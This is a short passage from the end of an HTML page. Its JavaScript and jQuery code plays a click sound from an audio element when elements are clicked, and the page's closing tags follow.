function klik1() {
    var audio = document.getElementById('klik1');
    audio.play();
}
$(document).ready(function(){
        $("o").attr("onclick", "klik1()");
});
//]]></script>
        
</audio></body>

</html>